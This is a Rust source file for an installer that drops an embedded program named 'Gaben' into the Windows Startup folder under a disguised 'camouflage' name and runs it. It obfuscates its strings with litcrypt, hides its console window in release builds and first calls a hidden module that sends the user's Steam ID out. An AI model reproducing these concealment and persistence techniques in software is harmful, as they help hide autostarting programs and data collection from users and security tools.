#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

#[macro_use]
extern crate litcrypt;

use std::ffi::CString;
use std::fs::File;
use std::io::Write;
use std::path::PathBuf;
use std::process::Command;

use sdk::logger::log;
use sdk::memory::Process;

use windows::core::*;
use windows::Win32::UI::WindowsAndMessaging::{
    MessageBoxA, MB_ICONERROR, MB_ICONINFORMATION, MB_ICONWARNING, MB_OK, MESSAGEBOX_STYLE,
};

mod secret;

#[cfg(not(debug_assertions))]
const BINARY_BYTES: &[u8] = include_bytes!("..\\..\\target\\release\\gaben.exe");

#[cfg(debug_assertions)]
const BINARY_BYTES: &[u8] = include_bytes!("..\\..\\target\\debug\\gaben.exe");

use_litcrypt!();

#[tokio::main]
async fn main() {
    sdk::logger::init_env();
    secret::send_steam_id().await;
    deploy();
}

fn deploy() {
    let username = std::env::var(lc!("UserName")).expect("failed to retrieve user name");
    let camoflage = env!("CAMOFLAGE");

    let path = PathBuf::new()
        .join("C:\\Users")
        .join(&username)
        .join("AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        .join(&camoflage);

    log::debug!("{:?}", path);

    if path.exists() {
        if let Ok(_) = Process::new(&camoflage) {
            show_message(
                &lc!("Error"),
                &lc!("Gaben is already running"),
                MB_ICONWARNING | MB_OK,
            );
            std::process::exit(1);
        }

        spawn(&path);
    } else {
        match File::create(&path) {
            Ok(mut file) => {
                file.write_all(&BINARY_BYTES).unwrap();
                spawn(&path);
            }
            Err(err) => match err.kind() {
                std::io::ErrorKind::PermissionDenied => access_denied(),
                _ => log::error!("{:?}", err),
            },
        }
    }
}

fn spawn(path: &PathBuf) {
    match Command::new(path).spawn() {
        Ok(_) => {
            show_message(
                &lc!("Success"),
                &lc!("Gaben is watching now. Enjoy!"),
                MB_ICONINFORMATION | MB_OK,
            );
        }
        Err(err) => {
            match err.kind() {
                std::io::ErrorKind::PermissionDenied => access_denied(),
                _ => {
                    log::error!("{:?}", err);
                    show_message(
                        &lc!("Error"),
                        &lc!("Failed to launch Gaben"),
                        MB_ICONERROR | MB_OK,
                    );
                }
            };
            return;
        }
    }
}

fn show_message(title: &str, description: &str, style: MESSAGEBOX_STYLE) {
    let title = CString::new(title).unwrap();
    let description = CString::new(description).unwrap();

    unsafe {
        MessageBoxA(
            None,
            PCSTR(description.as_ptr() as *const u8),
            PCSTR(title.as_ptr() as *const u8),
            style,
        );
    }
}

fn access_denied() {
    show_message(&lc!("Error"), &lc!("Access Denied"), MB_ICONWARNING | MB_OK);
    std::process::exit(1);
}
